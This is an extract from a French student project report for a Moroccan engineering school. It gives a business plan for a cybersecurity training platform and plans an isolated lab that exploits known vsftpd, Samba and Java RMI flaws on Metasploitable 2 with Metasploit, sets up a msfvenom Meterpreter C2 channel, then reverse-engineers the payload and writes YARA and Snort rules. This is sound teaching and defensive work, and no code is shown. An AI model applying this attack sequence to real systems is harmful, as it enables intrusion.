+2.2.3 Identiﬁcation du problème et limites des solutions existantes
+Les étudiants marocains en cybersécurité et en informatique disposent d’un accès limité à
+des environnements pratiques complets[cite : 1]. Les formations universitaires couvrent en général
+les concepts théoriques (réseaux, cryptographie, normes, gouvernance) mais oﬀrent rarement des
+travaux pratiques reproduisant une chaîne d’attaque réelle de bout en bout[cite : 1]. Ce manque
+crée un écart important entre les compétences académiques et les compétences opérationnelles
+attendues par les entreprises[cite : 1].
+Les plateformes internationales existantes (cyber-ranges et plateformes de CTF en ligne)
+présentent plusieurs limites pour le contexte marocain et africain francophone[cite : 1] :
+— Contenu majoritairement en anglais[cite : 1] ;
+— Tariﬁcation en devises étrangères (dollar, livre sterling) peu adaptée au pouvoir d’achat
+local et aux moyens de paiement marocains[cite : 1] ;
+— Absence d’alignement avec les cursus pédagogiques locaux[cite : 1] ;
+— Approche fragmentée où chaque plateforme se concentre généralement sur un seul as-
+pect (pentest, OU reverse engineering, OU détection), rarement sur une chaîne d’attaque
+continue et complète comme celle développée dans ce PF A[cite : 1].
+2.3 Présentation de l’idée et de la solution
+Le projet technique réalisé dans le cadre de ce PF A constitue la brique technologique de base
+de cette oﬀre entrepreneuriale[cite : 1].
+2.3.1 Description de la solution
+CyberRange Lab est une plateforme web qui met à disposition des apprenants des environne-
+ments de laboratoire virtuels, isolés et pré-conﬁgurés, accompagnés de scénarios guidés couvrant
+l’ensemble d’une chaîne d’attaque[cite : 1]. Chaque scénario reproduit la démarche suivie pendant
+ce PF A, avec une diﬃculté progressive et un environnement totalement isolé d’Internet[cite : 1].
+2.3.2 Fonctionnalités principales
+— Provisionnement à la demande de laboratoires virtuels isolés (machine attaquante type
+Kali Linux, machine victime type Metasploitable, environnement d’analyse type Fla-
+reVM)[cite : 1] ;
+— Scénarios guidés pas à pas, avec validation automatique des objectifs (capture de dra-
+peaux, identiﬁcation de l’IOC, écriture d’une règle de détection)[cite : 1] ;
+— Tableau de bord de progression individuel et badges de compétences par domaine (recon,
+exploitation, RE, détection)[cite : 1] ;
+— Contenu pédagogique entièrement en français, avec une déclinaison en arabe envisagée à
+terme[cite : 1] ;
+— Mode ń instructeur ż destiné aux écoles : création de classes, attribution de scénarios,
+suivi statistique des apprenants[cite : 1] ;
+— Bibliothèque évolutive de scénarios couvrant le pentest, le reverse engineering et la détec-
+tion, organisée par niveau de diﬃculté[cite : 1].
+6
+
+=== PAGE 18 ===
+CHAPITRE 2. ÉTUDE DE F AISABILITÉ ENTREPRENEURIALE : SOLUTION
+CYBERRANGE LAB EMSI
+2.3.3 Technologies utilisées
+La plateforme repose sur des technologies de virtualisation (Proxmox VE ou VMware ESXi)
+pour l’hébergement à la demande des machines virtuelles de laboratoire, sur des outils open source
+reconnus par l’industrie (Metasploit Framework, Nmap, Wireshark, Ghidra, Cuckoo Sandbox,
+YARA, Snort) pour le contenu technique, et sur une application web (interface utilisateur et API
+d’orchestration) pour la gestion des comptes, le provisionnement des labs, le suivi de progression
+et la facturation des abonnements[cite : 1].
+2.3.4 Valeur ajoutée et avantage concurrentiel
+Contrairement aux plateformes existantes, CyberRange Lab propose un parcours pédagogique
+continu reliant ces trois dimensions[cite : 1]. À cet avantage structurel s’ajoutent un contenu en
+français adapté aux cursus marocains et africains francophones, une tariﬁcation accessible en
+dirhams, et un ancrage académique fort né d’un PF A encadré par une école d’ingénieurs[cite :
+1].
+2.4 Origine de l’idée et analyse stratégique du marché
+2.4.1 Source et inspirations de l’idée
+L’idée est directement issue de l’expérience vécue durant la réalisation du PF A[cite : 1].
+En construisant elles-mêmes le laboratoire, les équipes ont constaté la diﬃculté à trouver des
+ressources pédagogiques en français couvrant l’ensemble de cette chaîne de manière cohérente,
+ainsi que le temps important nécessaire pour assembler, depuis zéro, un environnement fonction-
+nel[cite : 1]. Le concept s’inspire des plateformes internationales tout en adaptant le contenu et
+le modèle tarifaire au contexte marocain[cite : 1].
+2.4.2 Analyse de la concurrence
+Le tableau suivant synthétise le positionnement des concurrents directs et indirects face à
+l’oﬀre proposée :
+2.4.3 Analyse des fournisseurs et cadre réglementaire
+Le projet repose sur des fournisseurs d’hébergement cloud (comme OVH ou acteurs locaux),
+des éditeurs d’outils open source (Metasploit, Ghidra, etc.) et un opérateur de paiement en ligne
+(CMI)[cite : 1]. Le projet ne dépend fortement d’aucun fournisseur unique[cite : 1].
+Le secteur est encadré par la loi nř 05-20 (cybersécurité) et la loi nř 09-08 (protection des
+données personnelles), sous la supervision de la DGSSI et de la CNDP[cite : 1]. Une charte d’uti-
+lisation éthique et l’isolation totale des laboratoires permettent de limiter le risque juridique[cite :
+1].
+2.4.4 Outils d’analyse stratégique du marché
+Trois outils ont été mobilisés pour structurer l’étude : la matrice SWOT, l’analyse PESTEL
+et le modèle des 5 forces de Porter[cite : 1].
+7
+
+=== PAGE 19 ===
+CHAPITRE 2. ÉTUDE DE F AISABILITÉ ENTREPRENEURIALE : SOLUTION
+CYBERRANGE LAB EMSI
+Concurrent Type / Zone Modèle éco. F orces F aiblesses
+face à notre
+oﬀre
+TryHackMe Labs et CTF,
+international
+Freemium +
+Abo. devises
+Catalogue
+large, com-
+munauté,
+gamiﬁcation
+Contenu en
+anglais, prix
+devises, pas de
+pipeline intégré
+continu.
+HackTheBox Academy Cyber-range,
+international
+Abonnements
++ Certifs
+payantes
+Réputation
+forte, contenu
+avancé
+Coût élevé, en
+anglais, orienta-
+tion principale-
+ment pentest.
+Cyberbit / Immersive Labs Formation
+SOC, B2B,
+international
+Licences entre-
+prise
+Très complet,
+scénarios réels
+SOC
+Très coû-
+teux, réservé
+aux grandes
+entreprises,
+inaccessible aux
+étudiants.
+CyberRange Lab Maroc /
+Afrique fran-
+cophone
+F reemium
++ Abo. en
+MAD
+Pipeline com-
+plet, en fran-
+çais, tarif lo-
+cal accessible
+Marque jeune,
+catalogue ini-
+tial de scénarios
+plus restreint.
+Table 2.1 – Analyse comparative de la concurrence
+Catégorie Éléments identiﬁés
+F orces Équipe technique compétente ; coût de développement réduit (open source) ;
+positionnement unique (pipeline complet) ; contenu en français[cite : 1].
+F aiblesses Marque inconnue au lancement ; ressources ﬁnancières limitées ; absence de
+certiﬁcation internationale initiale ; catalogue restreint au départ[cite : 1].
+Opportunités Croissance de la demande IT au Maroc/Afrique ; stratégie nationale DGSSI
+favorable ; absence d’oﬀre locale équivalente ; partenariats écoles[cite : 1].
+Menaces Concurrents internationaux établis ; évolution rapide des techniques d’at-
+taque ; perception réglementaire des outils oﬀensifs ; ressources gra-
+tuites[cite : 1].
+Table 2.2 – Matrice SWOT du projet CyberRange Lab
+Dimension F acteurs identiﬁés
+Politique Stratégie nationale de cybersécurité du Maroc, soutien institutionnel de la
+DGSSI[cite : 1].
+Économique Croissance du secteur IT/oﬀshoring, budget de formation continue, pouvoir
+d’achat étudiant limité[cite : 1].
+Social Pénurie de compétences en cybersécurité, intérêt pour les métiers techniques
+et compétitions CTF[cite : 1].
+T echnologique Évolution rapide des menaces, démocratisation du cloud et de la virtualisa-
+tion à la demande[cite : 1].
+Écologique Recours à l’hébergement cloud virtualisé réduisant le besoin en matériel
+physique dédié[cite : 1].
+Légal Lois 05-20 (cybersécurité) et 09-08 (protection des données) ; cadre contrac-
+tuel pédagogique[cite : 1].
+Table 2.3 – Analyse PESTEL du projet
+8
+
+=== PAGE 20 ===
+CHAPITRE 2. ÉTUDE DE F AISABILITÉ ENTREPRENEURIALE : SOLUTION
+CYBERRANGE LAB EMSI
+F orce concurrentielle Niveau Analyse
+Concurrence intra-secteur Élevé Plusieurs plateformes internationales de
+cyber-range sont bien implantées.
+Pouvoir de négociation des clients Moyen à élevé Le segment étudiant est sensible au prix et
+peut utiliser le gratuit.
+Pouvoir de négociation des fournisseurs Faible Outils majoritairement open source et hé-
+bergeurs interchangeables.
+Menace de nouveaux entrants Moyen La barrière technique est réelle mais la bar-
+rière ﬁnancière reste faible.
+Menace des produits de substitution Élevé De nombreux tutoriels, vidéos et MOOC
+gratuits couvrent le contenu.
+Table 2.4 – Analyse des 5 forces de Porter
+2.5 Étude de faisabilité technique et marketing stratégique
+2.5.1 Ressources et proﬁls requis
+Les besoins matériels et humains ont été budgétisés pour assurer le fonctionnement opéra-
+tionnel :
+Élément Quantité Rôle
+Serveur de virtualisation (Proxmox VE) 2 (prod + secours) Hébergement à la demande des VMs
+de laboratoire.
+Stockage SSD haute capacité Selon volume Stockage des images des laboratoires
+et des snapshots.
+Bande passante réseau dédiée 1 abonnement pro Accès simultané de plusieurs appre-
+nants aux labs.
+Postes de développement 2 à 3 Développement et maintenance de la
+plateforme web.
+Licences logicielles Quasi nulles Outils techniques open source (Ghi-
+dra, YARA, Snort, etc.).
+Table 2.5 – Besoins matériels et infrastructure
+Proﬁl Quantité Rôle principal
+Développeur full-stack 1 Conception et maintenance de la plateforme web et de l’or-
+chestration.
+Ingénieur cybersécurité 1 à 2 Conception, mise à jour et validation des scénarios pédago-
+giques.
+Ingénieur DevOps / infra 1 Gestion des serveurs de virtualisation, isolation réseau, sécu-
+rité.
+Responsable commercial 1 Partenariats avec les écoles/entreprises, acquisition d’utilisa-
+teurs.
+Table 2.6 – Proﬁls de l’équipe requis au lancement
+2.5.2 Segmentation, Ciblage et Positionnement
+Quatre segments clés composent la demande : les étudiants en cybersécurité, les jeunes profes-
+sionnels, les écoles d’ingénieurs et les entreprises[cite : 1]. Le segment principal ciblé au lancement
+est celui des étudiants et jeunes professionnels (volume et bouche-à-oreille)[cite : 1]. CyberRange
+9
+
+=== PAGE 21 ===
+CHAPITRE 2. ÉTUDE DE F AISABILITÉ ENTREPRENEURIALE : SOLUTION
+CYBERRANGE LAB EMSI
+Lab se positionne comme une solution accessible (tarifs en dirhams), pratique (scénarios réels)
+et pédagogique (francophone et alignée sur les cursus)[cite : 1].
+2.5.3 Stratégie Marketing Mix (4P)
+— Produit : Accès SaaS via navigateur à une bibliothèque de laboratoires guidés couvrant
+l’ensemble de la chaîne d’attaque, sans installation locale[cite : 1].
+— Prix : Stratégie de pénétration. Palier freemium gratuit ; abonnement ń Étudiant ż à 99
+MAD / mois ; abonnement ń Professionnel ż à 299 MAD / mois ; forfaits B2B écoles/en-
+treprises sur contrat[cite : 1].
+— Distribution : Mode SaaS en ligne pour le grand public, et contrats de partenariat direct
+pour les écoles et entreprises[cite : 1].
+— Communication : Réseaux sociaux (LinkedIn, Discord, YouTube), diﬀusion de write-ups
+gratuits, partenariats avec les clubs d’écoles et sponsoring de CTF locaux[cite : 1].
+2.6 Étude de faisabilité ﬁnancière et cadre juridique
+2.6.1 Investissement initial et prévisions de ventes
+Les montants indicatifs ci-dessous correspondent à un régime de croisière atteint après 6 à 9
+mois d’activité[cite : 1].
+Élément d’investissement Quantité Coût unitaire (MAD) Coût total (MAD)
+Développement de la plateforme web 1 80 000 80 000
+Hébergement / Cloud (conﬁg ini-
+tiale)
+1 12 000 12 000
+Matériel informatique (serveur,
+postes)
+2 25 000 50 000
+Licences / outils complémentaires 1 8 000 8 000
+Design UI/UX 1 18 000 18 000
+Marketing de lancement 1 15 000 15 000
+Création juridique de l’entreprise 1 5 000 5 000
+Recrutement et formation initiale 1 12 000 12 000
+Autres (imprévus, ≈ 5 %) 1 10 000 10 000
+TOT AL INVESTISSEMENT
+INITIAL
+210 000 MAD
+Table 2.7 – Détail de l’investissement initial
+Produit / Service Prix de vente Quantité mensuelle Chiﬀre d’aﬀaires
+Abonnement ń Étudiant ż 99 MAD 150 14 850 MAD
+Abonnement ń Professionnel ż 299 MAD 30 8 970 MAD
+Forfaits écoles / entreprises 8 000 MAD 3 24 000 MAD
+TOT AL CHIFFRE D’AF-
+F AIRES MENSUEL
+47 820 MAD
+Table 2.8 – Prévisions de ventes mensuelles (régime de croisière)
+2.6.2 Structure des charges et rentabilité
+Les charges variables mensuelles s’élèvent à 9 795 MAD (comprenant 20 MAD/utilisateur
+de coût cloud, 3 % de commission CMI, 1 500 MAD de support, et 2 000 MAD d’acquisition
+10
+
+=== PAGE 22 ===
+CHAPITRE 2. ÉTUDE DE F AISABILITÉ ENTREPRENEURIALE : SOLUTION
+CYBERRANGE LAB EMSI
+marketing)[cite : 1]. Les charges ﬁxes mensuelles totalisent 30 300 MAD (salaires équipe : 18 000
+MAD, loyer : 2 500 MAD, serveur : 2 000 MAD, comptabilité : 1 000 MAD, CNSS : 1 800 MAD,
+marketing ﬁxe : 2 500 MAD, etc.)[cite : 1].
+Le coût total mensuel s’élève donc à 9 795 + 30 300 = 40 095 MAD [cite : 1]. Le résultat
+prévisionnel mensuel net est positif et s’établit à 47 820 − 40 095 = + 7 725 MAD [cite : 1].
+La marge brute est calculée comme suit[cite : 1] :
+M argebrute = Chif f red′af f aires− Chargesvariables = 47 820 − 9 795 = 38 025 MAD
+Le taux de marge sur coûts variables est de (38025 ÷ 47820) × 100 ≈ 79,5 % [cite : 1]. Le seuil de
+rentabilité mensuel (CA minimum pour couvrir les charges ﬁxes) est égal à[cite : 1] :
+Seuilderentabilit = Chargesf ixes
+T auxdemarge = 30 300
+0, 795 ≈ 38 113 MAD
+Le Chiﬀre d’Aﬀaires prévisionnel (47 820 MAD) étant supérieur à ce seuil, le projet est ﬁnan-
+cièrement viable[cite : 1]. Le Besoin en Fonds de Roulement (BFR) est estimé à 7 000 MAD
+(Crancesclientsde 12000M AD − Dettesf ournisseursde5000M AD, les stocks étant nuls)[cite :
+1].
+L’analyse ﬁnancière recommande de prévoir une réserve de sécurité de 3 à 6 mois de charges
+ﬁxes (soit 90 000 à 180 000 MAD) en plus de l’apport initial de 210 000 MAD aﬁn de pallier les
+risques de vitesse de montée en charge et de retard de paiement B2B[cite : 1].
+2.6.3 Cadre juridique
+La forme juridique retenue est la Société à Responsabilité Limitée (SARL) [cite : 1]. Ce choix
+s’explique par la limitation de la responsabilité ﬁnancière des fondateurs à leurs apports, la
+simplicité et le coût modéré de création, la crédibilité institutionnelle face aux clients B2B, et la
+ﬂexibilité pour une future augmentation de capital[cite : 1].
+2.7 Stratégie de développement à long terme
+Le développement de CyberRange Lab s’articule autour de trois phases successives[cite : 1] :
+— Phase 1 Lancement local (An 1) : Lancement de la plateforme auprès des écoles d’ingé-
+nieurs de Casablanca (en premier lieu l’EMSI) avec le catalogue initial issu de ce PF A, et
+animation de la communauté étudiante locale via les clubs cyber[cite : 1].
+— Phase 2 Extension nationale (An 2-3) : Déploiement dans d’autres villes du Maroc, signa-
+tures de contrats B2B de formation continue avec des banques et ESN, et enrichissement
+du catalogue (cloud, mobile, IoT industriel)[cite : 1].
+— Phase 3 Expansion régionale (An 3+) : Expansion vers les marchés francophones d’Afrique
+subsaharienne et du Maghreb (Sénégal, Côte d’Ivoire, Tunisie) partageant des contraintes
+linguistiques et tarifaires similaires, et reconnaissance oﬃcielle des badges délivrés par des
+instances de régulation[cite : 1].
+2.8 Conclusion
+L’analyse démontre que le laboratoire technique développé constitue la base d’une opportu-
+nité entrepreneuriale crédible[cite : 1]. Sous la forme de ń CyberRange Lab ż, ce projet répond
+à un besoin réel, possède un positionnement diﬀérenciant et présente des indicateurs ﬁnanciers
+encourageants[cite : 1]. Une phase d’entretiens de validation auprès d’utilisateurs et d’écoles
+partenaires constituera la suite naturelle avant le passage à l’action[cite : 1].
+11
+
+=== PAGE 23 ===
+Chapitre 3
+Conduite et gestion du projet
+3.1 Cahier des charges oﬃciel du projet
+3.1.1 Présentation et contexte du projet
+L’École Marocaine des Sciences de l’Ingénieur (EMSI) souhaite enrichir son oﬀre de formation
+en cybersécurité par des projets de ﬁn d’année à forte valeur pédagogique et professionnelle. Dans
+un contexte où les cyberattaques deviennent de plus en plus sophistiquées, la compréhension de
+la chaîne d’attaque complète de l’exploitation initiale jusqu’à l’analyse du malware déployé est
+devenue une compétence fondamentale pour tout professionnel de la sécurité informatique.
+Ce projet s’inscrit pleinement dans cette démarche en proposant la mise en place d’une solu-
+tion de simulation complète, reproductible et documentée, permettant d’étudier et de maîtriser
+les diﬀérentes phases d’une cyberattaque réelle dans un environnement contrôlé et isolé.
+3.1.2 Objectifs du projet
+L’objectif principal de ce projet est de concevoir et de mettre en uvre une solution de simula-
+tion d’une chaîne d’attaque complète, allant de la phase d’exploitation d’un système vulnérable
+jusqu’à l’ingénierie inverse du malware déployé.
+Les objectifs secondaires indispensables à la réussite de ce projet sont :
+— Mettre en place un environnement de laboratoire virtuel strictement restreint et sécurisé
+composé de deux machines virtuelles (Kali Linux et Metasploitable 2).
+— Simuler l’intégralité des phases d’une attaque réelle : reconnaissance active, exploitation
+de vulnérabilités CVE, déploiement de charges utiles et établissement d’un canal de Com-
+mand & Control (C2).
+— Réaliser une analyse approfondie du payload généré : analyse statique (Ghidra, PEStudio,
+FLOSS) et analyse dynamique (x64dbg).
+— Produire des règles de détection fonctionnelles et qualiﬁées (YARA pour la détection de
+ﬁchiers et Snort pour la détection réseau) basées sur les résultats de l’analyse.
+— Documenter de manière exhaustive les mesures de remédiation et de durcissement appli-
+cables sur les systèmes compromis.
+— Livrer un rapport technique de PF A complet, une démonstration live devant le jury ainsi
+qu’un tableau récapitulatif des Indicateurs de Compromission (IOCs).
+3.1.3 Description de l’existant
+— Environnement matériel : Le projet s’appuie sur les machines personnelles des étudiants
+ainsi que sur les infrastructures et salles informatiques de l’EMSI, toutes pleinement com-
+patibles avec l’exécution ﬂuide de logiciels de virtualisation modernes (VirtualBox / VM-
+ware).
+12
+
+=== PAGE 24 ===
+CHAPITRE 3. CONDUITE ET GESTION DU PROJET EMSI
+— Environnement logiciel : Aucune solution intégrée de simulation d’attaque de bout en
+bout n’est déployée à ce jour dans le cadre pédagogique de la spécialité cybersécurité. Les
+cours dispensés abordent les concepts de manière essentiellement théorique, sans proposer
+d’environnement pratique uniﬁé combinant les phases oﬀensives et défensives.
+— Outils disponibles : Les distributions de sécurité Kali Linux, les frameworks d’exploita-
+tion Metasploit, ainsi que les solutions avancées de reverse engineering telles que Ghidra
+(développé par la NSA) sont librement accessibles et open source.
+3.1.4 Critères d’acceptabilité du produit
+Le projet sera considéré comme acceptable et la livraison validée si et seulement si les critères
+stricts suivants sont remplis avec succès :
+1. Fonctionnalités : Toutes les phases clés de la chaîne d’attaque (reconnaissance, exploita-
+tion, payload, analyse statique, analyse dynamique et détection) doivent être technique-
+ment réalisées et documentées.
+2. Environnement : Le laboratoire virtuel doit être 100% opérationnel, totalement isolé des
+réseaux réels et facilement reproductible sur n’importe quel ordinateur hôte compatible.
+3. Analyse RE (Reverse Engineering) : Le payload malveillant extrait doit être désassemblé
+et décompilé de manière intelligible dans Ghidra, avec une identiﬁcation formelle des
+fonctions clés du système d’exploitation telles que VirtualAlloc, CreateRemoteThread ou
+connect().
+4. Détection : Au moins une règle de signature YARA fonctionnelle et une règle de détection
+réseau Snort doivent être produites, rigoureusement testées et validées en laboratoire.
+5. Documentation : Le rapport technique doit être exhaustif, rigoureusement structuré et
+accompagné de captures d’écran claires et annotées pour chaque étape de la simulation.
+6. Respect des délais : L’ensemble des livrables doit être ﬁnalisé et soumis dans le délai
+imparti de 8 semaines.
+7. Éthique et sécurité : L’intégralité du projet doit être conﬁnée dans un réseau virtuel
+strictement isolé de type Host-Only, interdisant formellement l’exécution d’attaques ou
+de tests sur des infrastructures de production réelles.
+—
+3.2 Expression détaillée des besoins
+3.2.1 Besoins fonctionnels
+La solution de simulation logicielle devra impérativement permettre de réaliser les opérations
+suivantes, hiérarchisées par ordre d’importance stratégique :
+a) Simulation de la phase oﬀensive (F ondamental)
+— Déclencher des scans réseau complets et furtifs aﬁn d’identiﬁer les ports ouverts, les ser-
+vices applicatifs actifs et leurs versions précises à l’aide de Nmap [ 12].
+— Identiﬁer et exploiter avec succès les vulnérabilités CVE critiques connues présentes sur
+le système cible Metasploitable 2 via le framework Metasploit [ 1].
+— Conﬁgurer et générer une charge utile Meterpreter personnalisée avec msfvenom aﬁn d’ins-
+tancier un canal persistant de Command & Control (C2) [ 1].
+— Capturer en temps réel l’intégralité des ﬂux et paquets réseau transitant sur le canal C2
+lors de la phase d’exploitation à l’aide de Wireshark [ 11].
+13
+
+=== PAGE 25 ===
+CHAPITRE 3. CONDUITE ET GESTION DU PROJET EMSI
+b) Analyse du payload Reverse Engineering (F ondamental)
+— Eﬀectuer une analysis statique globale du binaire malveillant : extraction des chaînes de
+caractères (strings), analyse de la structure des headers PE et détection des imports de
+DLL suspects.
+— Désassembler et décompiler le code machine du binaire sous Ghidra [ 2] aﬁn de cartogra-
+phier son ﬂux d’exécution interne et de repérer ses fonctions critiques.
+— Réaliser une analyse dynamique comportementale et collecter les indicateurs système clés
+(modiﬁcations de ﬁchiers, altérations de la base de registre et appels réseau).
+— Inspecter le binaire instruction par instruction à l’aide du débogueur x64dbg en plaçant
+des points d’arrêt (breakpoints) sur les appels système de bas niveau les plus sensibles.
+c) Détection, défense et remédiation (Important)
+— Écrire des règles de signature YARA [ 3] précises sur la base des motifs binaires et des
+chaînes textuelles identiﬁés lors de l’analyse statique.
+— Concevoir des règles de détection d’intrusion réseau Snort [ 4] basées sur les caractéristiques
+comportementales du traﬁc C2 stockées dans le ﬁchier de capture .pcap.
+— Appliquer des correctifs techniques (patching) et des conﬁgurations de durcissement sur la
+machine virtuelle cible pour valider l’ineﬃcacité future de l’attaque et conﬁrmer l’utilité
+des signatures de défense.
+d) Documentation, traçabilité et rapports (Important)
+— Documenter pas-à-pas chaque phase technique en fournissant la syntaxe exacte des com-
+mandes exécutées ainsi que des captures d’écran explicatives.
+— Structurer et consolider un tableau complet des Indicateurs de Compromission (IOCs)
+extraits lors de la phase analytique.
+— Produire un rapport d’ingénierie ﬁnal de haute qualité synthétisant la totalité de la chaîne
+cyber.
+3.2.2 Besoins non fonctionnels
+Ces exigences de haut niveau déﬁnissent les contraintes opérationnelles et qualitatives impo-
+sées à la solution :
+— Isolation réseau stricte : L’environnement de laboratoire virtuel doit être hermétiquement
+isolé de toute infrastructure réelle par un réseau privé virtuel de type Host-Only géré sous
+VirtualBox [ 10] ou VMware. Aucune machine virtuelle ne doit disposer d’un accès vers
+l’Internet externe durant le déclenchement des charges utiles.
+— Reproductibilité scientiﬁque : La solution logique et documentaire doit être totalement re-
+productible. Un ingénieur ou un enseignant tiers doit être capable de reconstruire à l’iden-
+tique l’environnement virtuel complet en suivant uniquement la documentation technique
+livrée.
+— Sécurité des artéfacts : Les payloads compilés et les scripts d’exploitation malveillants ne
+doivent sous aucun prétexte franchir le périmètre de la mémoire virtuelle. Des instantanés
+système (snapshots) doivent être pris obligatoirement avant d’amorcer une nouvelle phase
+d’attaque aﬁn de se prémunir contre la corruption de l’environnement.
+— Traçabilité totale : Chaque commande invoquée par l’analyste, chaque module d’exploi-
+tation Metasploit mis en uvre et chaque résultat obtenu doit faire l’objet d’un archivage
+précis associé à son horodatage machine.
+— Portabilité système : Le laboratoire doit faire preuve d’une agnosticité matérielle par-
+faite et pouvoir être déployé de manière équivalente sur des systèmes d’exploitation hôtes
+Windows ou Linux via des solutions d’hyperviseurs standards.
+14
+
+=== PAGE 26 ===
+CHAPITRE 3. CONDUITE ET GESTION DU PROJET EMSI
+—
+3.3 Cycle de vie du projet : Approche Méthodologique Agile
+3.3.1 Justiﬁcation du choix du framework Agile Scrum
+L’analyse de programmes malveillants, la conﬁguration de signatures réseau complexes (Snort)
+et l’ingénierie inverse sous Ghidra comportent par nature un fort degré d’incertitude technique
+et un risque élevé d’eﬀet tunnel. Opter pour un cycle de vie rigide et linéaire en Cascade aurait
+mis en péril le respect des jalons temporels ﬁxés par l’école.
+Pour garantir une ﬂexibilité maximale et une correction continue des trajectoires de dévelop-
+pement, nous avons adopté une méthodologie Agile calquée sur le framework Scrum , réadaptée
+aux eﬀectifs d’un binôme d’ingénieurs sur un horizon de 8 semaines. Le projet est rythmé par
+des rituels simpliﬁés : un Sprint Planning toutes les deux semaines pour déﬁnir les objectifs
+techniques du carnet de produit ( Product Backlog ), une réunion de synchronisation rapide à
+chaque séance de travail pour écarter les obstacles, et une Sprint Review pour valider le bon
+fonctionnement de chaque lot technique (par exemple, la conﬁrmation de l’obtention d’un accès
+root distant).
+3.3.2 Planiﬁcation et ordonnancement structurel des Sprints
+La réalisation du projet est découpée en 4 vagues itératives (Sprints) d’une durée ferme de 2
+semaines chacune, s’harmonisant avec le cycle de la Cyber Kill Chain [ 6] :
+— Sprint 1 (Semaines 1-2) Cadrage, Spéciﬁcations et Initialisation du Laboratoire : Rédac-
+tion et signature du cahier des charges oﬃciel. Installation, durcissement et conﬁguration
+réseau en mode Host-Only du binôme de machines virtuelles (Kali Linux [ 9] et Metas-
+ploitable 2 [ 8]). À l’issue de ce sprint, l’étanchéité et la connectivité réseau du laboratoire
+doivent être validées à 100%.
+— Sprint 2 (Semaines 3-4) Phase Oﬀensive, Scans de Vulnérabilités et Exploitation de
+Niveau 1 : Exécution des phases de reconnaissance active et cartographie des services avec
+Nmap [12]. Identiﬁcation et exploitation réussie des failles vsftpd et Samba via Metasploit,
+accompagnée de la capture systématique des trames réseau au format .pcap.
+— Sprint 3 (Semaines 5-6) Post-Exploitation, Payload Engineering et Reverse Engineering :
+Exploitation avancée du protocole Java RMI, conﬁguration et injection du payload per-
+sonnalisé avec msfvenom et instanciation de la session de Command & Control. Extraction
+du ﬁchier binaire et déclenchement de la décompilation et du désassemblage statique sous
+Ghidra [ 2].
+— Sprint 4 (Semaines 7-8) Ingénierie Défensive, Détection, Remédiation et Clôture : Tra-
+duction des indicateurs système et réseau découverts en règles de signatures formalisées
+sous YARA [ 3] et Snort [ 4]. Phase de remédiation par application de patchs sur la cible
+vulnérable. Rédaction ﬁnale du document d’ingénierie sous LaTeX et préparation des
+répétitions orales de la soutenance devant le jury.
+—
+3.4 Découpage analytique du projet (WBS) et Allocation des
+Ressources
+3.4.1 Dictionnaire des Tâches (Work Breakdown Structure)
+Pour piloter eﬃcacement le projet, les lots de travaux ont été fragmentés en sous-tâches
+élémentaires. Le tableau 3.1 formalise l’arborescence analytique complète du WBS et la charge
+15
+
+=== PAGE 27 ===
+CHAPITRE 3. CONDUITE ET GESTION DU PROJET EMSI
+de travail associée, estimée à une charge globale cumulée de 37 Jours-Hommes .
+Code T ask Intitulé Analytique de la Tâche T echnique Ressource Charge (J-H)
+WP1 Cadrage et Architecture de Conﬁnement 5
+T1.1 Analyse de l’état de l’art et étude théorique Azzat & Hnid 2
+T1.2 Rédaction, ajustement et validation du cahier des
+charges
+Azzat & Hnid 1
+T1.3 Déploiement et routage du réseau Host-Only (2-VM Se-
+tup)
+Azzat Nouamane 2
+WP2 Opérations Oﬀensives & Reconnaissance active 9
+T2.1 Balayage de ports, audit de bannières applicatives
+(Nmap)
+Azzat Nouamane 2
+T2.2 Exploitation ciblée de la backdoor vsftpd 2.3.4 Azzat Nouamane 3
+T2.3 Exploitation par injection de commandes sur Samba
+3.0.20
+Azzat Nouamane 4
+WP3 Payload Engineering & Reverse Engineering 10
+T3.1 Pivot distant sur Java RMI et conﬁguration du canal
+C2
+Azzat Nouamane 3
+T3.2 Génération, compilation et extraction du payload via
+msfvenom
+Hnid Aimane 2
+T3.3 Analyse statique, graphe d’appels et décompilation sous
+Ghidra
+Hnid Aimane 5
+WP4 Ingénierie de Détection, Remédiation et Défense 5
+T4.1 Analyse comportementale réseau et signature Snort/Su-
+ricata
+Hnid Aimane 2
+T4.2 Modélisation et tests de détection heuristique avec
+YARA
+Hnid Aimane 3
+WP5 Clôture du Projet et Restitution 8
+T5.1 Rédaction des chapitres techniques et intégration LaTeX Azzat & Hnid 6
+T5.2 Création des supports visuels et simulations orales à
+blanc
+Azzat & Hnid 2
+Charge T otale Évaluée 37 J-H
+Table 3.1 – Structure de découpage du projet (WBS) et évaluation des charges.
+3.4.2 Matrice des responsabilités et gouvernance (RACI)
+Pour formaliser sans ambiguïté les rôles de chaque membre du binôme de la Maîtrise d’uvre
+(MOE), la matrice RACI présentée dans le tableau 3.2 déﬁnit la répartition des responsabilités
+opérationnelles.
+Légende : R (Responsible) : Réalise la tâche ; A (Accountable) : Approuve et endosse la res-
+ponsabilité ﬁnale ; C (Consulted) : Fournit des données d’expertise ; I (Informed) : Tenu informé
+de l’avancement.
+—
+3.5 Planiﬁcation temporelle et Jalons de livraison
+3.5.1 Modélisation de la planiﬁcation et Feuille de route sous Jira
+Pour transposer opérationnellement les exigences de notre WBS et du cahier des charges,
+nous avons exploité la suite professionnelle de gestion de projet Jira (et son moteur natif de
+modélisation chronologique équivalent à MS Project).
+Chaque grand lot de travail (WP) a été conﬁguré sous la forme d’un ticket majeur de type
+Epic. Ces épopées ont été subdivisées en User Stories assignées individuellement aux membres
+16
+
+=== PAGE 28 ===
+CHAPITRE 3. CONDUITE ET GESTION DU PROJET EMSI
+Code Livrable T echnique / Activité Opération-
+nelle
+Azzat Nouamane Hnid Aimane
+T1.3 Déploiement et durcissement de l’infrastructure
+réseau du Lab
+R / A C
+T2.1 Cartographie réseau et rapports d’audit de ban-
+nières Nmap
+R / A I
+T2.2 Écriture des modules d’exploitation vsftpd et
+Samba
+R / A C
+T3.1 Pivot Java RMI et conﬁguration du listener Me-
+tasploit
+R / A I
+T3.2 Compilation et livraison du binaire exécutable
+malveillant
+C R / A
+T3.3 Cartographie des fonctions et arbres d’appels sous
+Ghidra
+I R / A
+T4.1 Fichier de règles Snort pour la détection réseau
+du C2
+C R / A
+T4.2 Fichier de signatures YARA pour la détection sys-
+tème
+C R / A
+T5.1 Rédaction, mise en page et révision du rapport
+LaTeX
+R / A R / A
+Table 3.2 – Matrice RACI d’aﬀectation des rôles du projet.
+de l’équipe selon la logique RACI. Le suivi dynamique du travail s’est eﬀectué via un tableau
+Kanban numérique structuré selon les statuts industriels standards : To Do (À faire), In Progress
